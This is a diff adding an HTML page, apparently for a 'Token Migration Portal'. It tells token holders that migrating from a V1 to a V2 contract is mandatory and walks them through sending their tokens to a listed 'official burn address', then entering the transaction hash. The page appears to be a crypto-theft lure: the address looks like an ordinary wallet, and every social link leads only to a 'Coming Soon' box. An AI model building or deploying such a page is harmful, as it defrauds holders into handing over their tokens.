@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Migration v2 - Official Portal</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Token Migration Portal</h1>
+            <p>Official V1 → V2 Contract Upgrade</p>
+        </div>
+    </div>
+
+    <!-- Popup 1: Initial Migration Prompt -->
+    <div id="popup1" class="popup active">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h2>Token Migration</h2>
+            </div>
+            <div class="popup-body">
+                <h3>🔄 Official V1 → V2 Migration Process</h3>
+                <p>To ensure the long-term stability, scalability, and security of the project, we are migrating from the V1 contract to an upgraded V2 contract.</p>
+                <p>This migration is mandatory and designed to protect holders, eliminate legacy limitations, and unlock improved functionality.</p>
+                <hr style="margin: 20px 0; border: none; border-top: 1px solid #ddd;">
+                <p style="margin-top: 20px;">Ready to migrate your tokens to v2?</p>
+            </div>
+            <div class="popup-footer">
+                <div class="popup-footer-buttons">
+                    <button id="migrateBtn" class="btn btn-primary">Migrate to v2</button>
+                </div>
+                <div class="popup-footer-social">
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Telegram">✈️</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup 2: Burn Address Instructions -->
+    <div id="popup2" class="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h2>🪙 How the Migration Works</h2>
+            </div>
+            <div class="popup-body">
+                <div class="migration-steps">
+                    <h3>Simple & Secure Process</h3>
+                    <ol>
+                        <li>Send your V1 tokens to the official burn address listed below</li>
+                        <li>Tokens are irreversibly destroyed (publicly visible on the blockchain)</li>
+                        <li>Our migration system automatically verifies the burn transaction</li>
+                        <li>You receive V2 tokens at a 1:1 ratio to the same wallet address</li>
+                    </ol>
+                </div>
+                <p style="margin-top: 20px; margin-bottom: 15px; color: #a0a0b0; font-size: 0.9rem;">📍 Official Burn Address:</p>
+                <div class="address-box">
+                    <code id="burnAddress">0xCafE541c1c89766d34995f101Be5A669657846Ac</code>
+                    <button id="copyBtn" class="btn-copy" title="Copy address">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+            <div class="popup-footer">
+                <div class="popup-footer-buttons">
+                    <button id="backBtn1" class="btn btn-secondary">← Back</button>
+                    <button id="confirmBurnBtn" class="btn btn-primary">Confirm Burn</button>
+                </div>
+                <div class="popup-footer-social">
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Telegram">✈️</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup 3: Transaction Hash Input -->
+    <div id="popup3" class="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h2>Enter Transaction Hash</h2>
+            </div>
+            <div class="popup-body">
+                <p>Input transaction hash:</p>
+                <input type="text" id="txHashInput" class="input-field" placeholder="0x..." />
+            </div>
+            <div class="popup-footer">
+                <div class="popup-footer-buttons">
+                    <button id="backBtn2" class="btn btn-secondary">← Back</button>
+                    <button id="confirmTxBtn" class="btn btn-primary">Confirm</button>
+                </div>
+                <div class="popup-footer-social">
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Telegram">✈️</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup 4: Loading and Confirmation -->
+    <div id="popup4" class="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h2 id="popup4Title">Processing...</h2>
+            </div>
+            <div class="popup-body">
+                <div id="loadingSpinner" class="loading-spinner">
+                    <div class="spinner"></div>
+                </div>
+                <p id="popup4Message">Please wait while we process your transaction</p>
+            </div>
+            <div class="popup-footer">
+                <div class="popup-footer-social" style="border-top: none; padding-top: 0;">
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Telegram">✈️</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
+                    <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Coming Soon Modal -->
+    <div id="comingSoonOverlay" class="coming-soon-overlay"></div>
+    <div id="comingSoonModal" class="coming-soon-modal">
+        <h2>⏰ Coming Soon</h2>
+        <p>This feature will be available very soon!</p>
+        <button onclick="closeComingSoon()">Close</button>
+    </div>
+
+    <!-- Footer with Social Icons -->
+    <div class="footer">
+        <div class="social-icon" onclick="showComingSoon()" title="Telegram">
+            ✈️
+        </div>
+        <div class="social-icon" onclick="showComingSoon()" title="X (Twitter)">
+            𝕏
+        </div>
+        <div class="social-icon" onclick="showComingSoon()" title="Website">
+            🌐
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
